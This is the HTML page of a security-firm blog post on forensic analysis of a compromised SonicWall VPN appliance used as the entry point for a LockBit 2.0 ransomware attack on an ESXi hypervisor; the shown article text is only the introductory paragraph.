<!DOCTYPE html>

<html lang="en-US">

<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    
    <title>VPN Appliance Forensics &#8211; Compass Security Blog</title>
<meta name='robots' content='max-image-preview:large' />

            <script data-no-defer="1" data-ezscrex="false" data-cfasync="false" data-pagespeed-no-defer data-cookieconsent="ignore">
                var ctPublicFunctions = {"_ajax_nonce":"d0374b2224","_rest_nonce":"3cae507474","_ajax_url":"\/wp-admin\/admin-ajax.php","_rest_url":"https:\/\/blog.compass-security.com\/wp-json\/","data__cookies_type":"none","data__ajax_type":"admin_ajax","text__wait_for_decoding":"Decoding the contact data, let us a few seconds to finish. Anti-Spam by CleanTalk","cookiePrefix":"","wprocket_detected":false}
            </script>
        
            <script data-no-defer="1" data-ezscrex="false" data-cfasync="false" data-pagespeed-no-defer data-cookieconsent="ignore">
                var ctPublic = {"_ajax_nonce":"d0374b2224","settings__forms__check_internal":"0","settings__forms__check_external":"0","settings__forms__search_test":"0","settings__data__bot_detector_enabled":"0","blog_home":"https:\/\/blog.compass-security.com\/","pixel__setting":"0","pixel__enabled":false,"pixel__url":null,"data__email_check_before_post":"1","data__cookies_type":"none","data__key_is_ok":true,"data__visible_fields_required":true,"wl_brandname":"Anti-Spam by CleanTalk","wl_brandname_short":"CleanTalk","ct_checkjs_key":1205255341,"emailEncoderPassKey":"c84910524510b490c51a98f4222ba430","bot_detector_forms_excluded":"W10=","advancedCacheExists":false,"varnishCacheExists":false,"wc_ajax_add_to_cart":false}
            </script>
        <link rel="alternate" type="application/rss+xml" title="Compass Security Blog &raquo; Feed" href="https://blog.compass-security.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Compass Security Blog &raquo; Comments Feed" href="https://blog.compass-security.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Compass Security Blog &raquo; VPN Appliance Forensics Comments Feed" href="https://blog.compass-security.com/2022/03/vpn-appliance-forensics/feed/" />
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/blog.compass-security.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://blog.compass-security.com/wp-includes/css/dist/block-library/style.min.css?ver=6.6.2' type='text/css' media='all' />
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #fff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--accent: #014176;--wp--preset--color--dark-gray: #444;--wp--preset--color--medium-gray: #666;--wp--preset--color--light-gray: #888;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 16px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 24px;--wp--preset--font-size--x-large: 42px;--wp--preset--font-size--regular: 19px;--wp--preset--font-size--larger: 32px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='ct_public_css-css' href='https://blog.compass-security.com/wp-content/plugins/cleantalk-spam-protect/css/cleantalk-public.min.css?ver=6.42.1' type='text/css' media='all' />
<link rel='stylesheet' id='wp-featherlight-css' href='https://blog.compass-security.com/wp-content/plugins/wp-featherlight/css/wp-featherlight.min.css?ver=1.3.4' type='text/css' media='all' />
<link rel='stylesheet' id='enlighterjs-css' href='https://blog.compass-security.com/wp-content/plugins/enlighter/cache/enlighterjs.min.css?ver=bolAfeK8q5zoJbL' type='text/css' media='all' />
<link rel='stylesheet' id='hemingway_googleFonts-css' href='https://blog.compass-security.com/wp-content/themes/hemingway/assets/css/fonts.css' type='text/css' media='all' />
<link rel='stylesheet' id='hemingway_style-css' href='https://blog.compass-security.com/wp-content/themes/hemingway/style.css?ver=2.3.2' type='text/css' media='all' />
<link rel='stylesheet' id='child-style-css' href='https://blog.compass-security.com/wp-content/themes/compass_security/style.css?ver=21.1.0' type='text/css' media='all' />
<script type="text/javascript" src="https://blog.compass-security.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://blog.compass-security.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script type="text/javascript" data-pagespeed-no-defer src="https://blog.compass-security.com/wp-content/plugins/cleantalk-spam-protect/js/apbct-public-bundle.min.js?ver=6.42.1" id="ct_public_functions-js"></script>
<script type="text/javascript" src="https://blog.compass-security.com/wp-content/themes/compass_security/js/featherlight_img.js?ver=6.6.2" id="wp-featherlight-img-js"></script>
<link rel="https://api.w.org/" href="https://blog.compass-security.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://blog.compass-security.com/wp-json/wp/v2/posts/6213" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blog.compass-security.com/xmlrpc.php?rsd" />
<link rel="canonical" href="https://blog.compass-security.com/2022/03/vpn-appliance-forensics/" />
<link rel='shortlink' href='https://blog.compass-security.com/?p=6213' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://blog.compass-security.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblog.compass-security.com%2F2022%2F03%2Fvpn-appliance-forensics%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://blog.compass-security.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblog.compass-security.com%2F2022%2F03%2Fvpn-appliance-forensics%2F&#038;format=xml" />

        <!--Customizer CSS-->

        <style type="text/css">
            body::selection { background:#014176; }            body a { color:#014176; }            body a:hover { color:#014176; }            .blog-title a:hover { color:#014176; }            .blog-menu a:hover { color:#014176; }            .blog-search #searchsubmit { background-color:#014176; }            .blog-search #searchsubmit { border-color:#014176; }            .blog-search #searchsubmit:hover { background-color:#014176; }            .blog-search #searchsubmit:hover { border-color:#014176; }            .featured-media .sticky-post { background-color:#014176; }            .post-title a:hover { color:#014176; }            .post-meta a:hover { color:#014176; }            .post-content a { color:#014176; }            .post-content a:hover { color:#014176; }            .blog .format-quote blockquote cite a:hover { color:#014176; }            .post-content a.more-link:hover { background-color:#014176; }            .post-content input[type="submit"]:hover { background-color:#014176; }            .post-content input[type="reset"]:hover { background-color:#014176; }            .post-content input[type="button"]:hover { background-color:#014176; }            .post-content fieldset legend { background-color:#014176; }            .post-content .searchform #searchsubmit { background:#014176; }            .post-content .searchform #searchsubmit { border-color:#014176; }            .post-content .searchform #searchsubmit:hover { background:#014176; }            .post-content .searchform #searchsubmit:hover { border-color:#014176; }            .post-categories a { color:#014176; }            .post-categories a:hover { color:#014176; }            .post-tags a:hover { background:#014176; }            .post-tags a:hover:after { border-right-color:#014176; }            .post-nav a:hover { color:#014176; }            .archive-nav a:hover { color:#014176; }            .logged-in-as a { color:#014176; }            .logged-in-as a:hover { color:#014176; }            .content #respond input[type="submit"]:hover { background-color:#014176; }            .comment-meta-content cite a:hover { color:#014176; }            .comment-meta-content p a:hover { color:#014176; }            .comment-actions a:hover { color:#014176; }            #cancel-comment-reply-link { color:#014176; }            #cancel-comment-reply-link:hover { color:#014176; }            .comment-nav-below a:hover { color:#014176; }            .widget-title a { color:#014176; }            .widget-title a:hover { color:#014176; }            .widget_text a { color:#014176; }            .widget_text a:hover { color:#014176; }            .widget_rss a { color:#014176; }            .widget_rss a:hover { color:#014176; }            .widget_archive a { color:#014176; }            .widget_archive a:hover { color:#014176; }            .widget_meta a { color:#014176; }            .widget_meta a:hover { color:#014176; }            .widget_recent_comments a { color:#014176; }            .widget_recent_comments a:hover { color:#014176; }            .widget_pages a { color:#014176; }            .widget_pages a:hover { color:#014176; }            .widget_links a { color:#014176; }            .widget_links a:hover { color:#014176; }            .widget_recent_entries a { color:#014176; }            .widget_recent_entries a:hover { color:#014176; }            .widget_categories a { color:#014176; }            .widget_categories a:hover { color:#014176; }            .widget_search #searchsubmit { background:#014176; }            .widget_search #searchsubmit { border-color:#014176; }            .widget_search #searchsubmit:hover { background:#014176; }            .widget_search #searchsubmit:hover { border-color:#014176; }            #wp-calendar a { color:#014176; }            #wp-calendar a:hover { color:#014176; }            #wp-calendar tfoot a:hover { color:#014176; }            .dribbble-shot:hover { background:#014176; }            .widgetmore a { color:#014176; }            .widgetmore a:hover { color:#014176; }            .flickr_badge_image a:hover img { background:#014176; }            .footer .flickr_badge_image a:hover img { background:#014176; }            .footer .dribbble-shot:hover img { background:#014176; }            .sidebar .tagcloud a:hover { background:#014176; }            .footer .tagcloud a:hover { background:#014176; }            .credits a:hover { color:#014176; }
            body#tinymce.wp-editor a { color:#014176; }            body#tinymce.wp-editor a:hover { color:#014176; }        </style>

        <!--/Customizer CSS-->

        <style type="text/css"><!-- Customizer CSS -->::selection { background-color: #014176; }.featured-media .sticky-post { background-color: #014176; }fieldset legend { background-color: #014176; }:root .has-accent-background-color { background-color: #014176; }button:hover { background-color: #014176; }.button:hover { background-color: #014176; }.faux-button:hover { background-color: #014176; }a.more-link:hover { background-color: #014176; }.wp-block-button__link:hover { background-color: #014176; }.is-style-outline .wp-block-button__link.has-accent-color:hover { background-color: #014176; }.wp-block-file__button:hover { background-color: #014176; }input[type="button"]:hover { background-color: #014176; }input[type="reset"]:hover { background-color: #014176; }input[type="submit"]:hover { background-color: #014176; }.post-tags a:hover { background-color: #014176; }.content #respond input[type="submit"]:hover { background-color: #014176; }.search-form .search-submit { background-color: #014176; }.sidebar .tagcloud a:hover { background-color: #014176; }.footer .tagcloud a:hover { background-color: #014176; }.is-style-outline .wp-block-button__link.has-accent-color:hover { border-color: #014176; }.post-tags a:hover:after { border-right-color: #014176; }a { color: #014176; }.blog-title a:hover { color: #014176; }.blog-menu a:hover { color: #014176; }.post-title a:hover { color: #014176; }.post-meta a:hover { color: #014176; }.blog .format-quote blockquote cite a:hover { color: #014176; }:root .has-accent-color { color: #014176; }.post-categories a { color: #014176; }.post-categories a:hover { color: #014176; }.post-nav a:hover { color: #014176; }.archive-nav a:hover { color: #014176; }.comment-meta-content cite a:hover { color: #014176; }.comment-meta-content p a:hover { color: #014176; }.comment-actions a:hover { color: #014176; }#cancel-comment-reply-link { color: #014176; }#cancel-comment-reply-link:hover { color: #014176; }.widget-title a { color: #014176; }.widget-title a:hover { color: #014176; }.widget_text a { color: #014176; }.widget_text a:hover { color: #014176; }.widget_rss a { color: #014176; }.widget_rss a:hover { color: #014176; }.widget_archive a { color: #014176; }.widget_archive a:hover { color: #014176; }.widget_meta a { color: #014176; }.widget_meta a:hover { color: #014176; }.widget_recent_comments a { color: #014176; }.widget_recent_comments a:hover { color: #014176; }.widget_pages a { color: #014176; }.widget_pages a:hover { color: #014176; }.widget_links a { color: #014176; }.widget_links a:hover { color: #014176; }.widget_recent_entries a { color: #014176; }.widget_recent_entries a:hover { color: #014176; }.widget_categories a { color: #014176; }.widget_categories a:hover { color: #014176; }#wp-calendar a { color: #014176; }#wp-calendar a:hover { color: #014176; }#wp-calendar tfoot a:hover { color: #014176; }.wp-calendar-nav a:hover { color: #014176; }.widgetmore a { color: #014176; }.widgetmore a:hover { color: #014176; }</style><!-- /Customizer CSS --><link rel="icon" href="https://blog.compass-security.com/wp-content/uploads/2017/03/compass_128x128.png" sizes="32x32" />
<link rel="icon" href="https://blog.compass-security.com/wp-content/uploads/2017/03/compass_128x128.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://blog.compass-security.com/wp-content/uploads/2017/03/compass_128x128.png" />
<meta name="msapplication-TileImage" content="https://blog.compass-security.com/wp-content/uploads/2017/03/compass_128x128.png" />
		<style type="text/css" id="wp-custom-css">
			.cli-switch input:checked + .cli-slider {
    background-color: rgb(1, 65, 118);
}

.cli-tab-footer .wt-cli-privacy-accept-btn {
    background-color: rgb(1, 65, 118);
}

.post-content .horizontal-scroll code {
  overflow: auto;
	white-space: pre;
	word-wrap: normal;
}		</style>
		
</head>

<body class="post-template-default single single-post postid-6213 single-format-standard wp-featherlight-captions">

<div class="big-wrapper">

    <div class="header-cover section bg-dark-light no-padding">

        <div class="header section"
             style="background-image: url(https://blog.compass-security.com/wp-content/themes/compass_security/images/header.png);">

            <div class="header-inner section-inner">

                
                    <div class="blog-info">

                        <h2 class="blog-title">
                            <a href="https://blog.compass-security.com"
                               title="Compass Security Blog &mdash; Offensive Defense"
                               rel="home">Compass Security Blog</a>
                        </h2>

                        
                            <h3 class="blog-description">Offensive Defense</h3>

                        
                    </div> <!-- /blog-info -->

                
            </div> <!-- /header-inner -->

        </div> <!-- /header -->

    </div> <!-- /bg-dark -->

    <div class="navigation section no-padding bg-dark">

        <div class="navigation-inner section-inner">

            <div class="toggle-container hidden">

                <div class="nav-toggle toggle">

                    <div class="bar"></div>
                    <div class="bar"></div>
                    <div class="bar"></div>

                    <div class="clear"></div>

                </div>

                <div class="search-toggle toggle">

                    <div class="metal"></div>
                    <div class="glass"></div>
                    <div class="handle"></div>

                </div>

                <div class="clear"></div>

            </div> <!-- /toggle-container -->

            <div class="blog-search hidden">

                <form method="get" class="searchform" action="https://blog.compass-security.com/">
    <input type="search" value="" placeholder="Search" name="s" id="s"/>
    <input type="submit" id="searchsubmit" value="Search">
</form>
            </div>

            <ul class="blog-menu">

                <li id="menu-item-4780" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-4780"><a href="https://blog.compass-security.com/">Home</a></li>
<li id="menu-item-4781" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4781"><a href="https://blog.compass-security.com/archive/">Archive</a></li>
<li id="menu-item-4782" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4782"><a href="https://blog.compass-security.com/contact/">Contact</a></li>
<li id="menu-item-4783" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4783"><a href="https://blog.compass-security.com/mailing-list-tigerinfo/">Newsletter</a></li>
<li id="menu-item-4793" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4793"><a href="https://twitter.com/compasssecurity"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
<li id="menu-item-4794" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4794"><a href="https://ch.linkedin.com/company/compass-security-ag"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
<li id="menu-item-4792" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4792"><a href="https://compass-security.com/"><i class="fas fa-globe" aria-hidden="true"></i></a></li>

                <li class="header-search">
                    <form method="get" id="menusearchsm2" class="searchform"
                          action="https://blog.compass-security.com/">
                        <input type="search" value="" placeholder="Search" name="s"
                               id="sm2"/>
                        <div class="search-lupe">
                            <div class="metal"></div>
                            <div class="glass"></div>
                            <div class="handle"></div>
                        </div>
                    </form>
                </li>

                <!-- TODO where to place the logo if wanted -->
                
                <div class="clear"></div>

            </ul>

            <ul class="mobile-menu">

                <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-4780"><a href="https://blog.compass-security.com/">Home</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4781"><a href="https://blog.compass-security.com/archive/">Archive</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4782"><a href="https://blog.compass-security.com/contact/">Contact</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4783"><a href="https://blog.compass-security.com/mailing-list-tigerinfo/">Newsletter</a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4793"><a href="https://twitter.com/compasssecurity"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4794"><a href="https://ch.linkedin.com/company/compass-security-ag"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4792"><a href="https://compass-security.com/"><i class="fas fa-globe" aria-hidden="true"></i></a></li>

            </ul>

        </div> <!-- /navigation-inner -->

    </div> <!-- /navigation -->
<div class="wrapper section-inner">

	<div class="content left">

		
			<div class="posts">

				<div id="post-6213" class="post-6213 post type-post status-publish format-standard has-post-thumbnail hentry category-forensic category-incident-response category-write-up tag-firewall tag-sonicwall">

					<div class="post-header">

						
					    <h1 class="post-title"><a href="https://blog.compass-security.com/2022/03/vpn-appliance-forensics/" rel="bookmark" title="VPN Appliance Forensics">VPN Appliance Forensics</a></h1>

					    <div class="post-meta">

							<span class="post-date"><a href="https://blog.compass-security.com/2022/03/vpn-appliance-forensics/" title="VPN Appliance Forensics">March 21, 2022</a></span>

							<span class="date-sep"> / </span>

							<span class="post-author"><a href="https://blog.compass-security.com/author/bbruppac/" title="Posts by Benjamin Bruppacher" rel="author">Benjamin Bruppacher</a></span>

							<span class="date-sep"> / </span>

							<a href="https://blog.compass-security.com/2022/03/vpn-appliance-forensics/#respond"><span class="comment">0 Comments</span></a>
							
						</div>

					</div> <!-- /post-header -->

					<div class="post-content">

						
<p>During a DFIR (Digital Forensics and Incident Response) Case, we encountered an  ESXi Hypervisor that was encrypted by the Ransomware LockBit 2.0. Suspicious SSH logons on the Hypervisor originated from an End-of-Life VPN Appliance (SonicWall SRA 4600). It turns out, this was the initial entry point for the Ransomware attack. Follow us into the forensics analysis of this compromised device.</p>



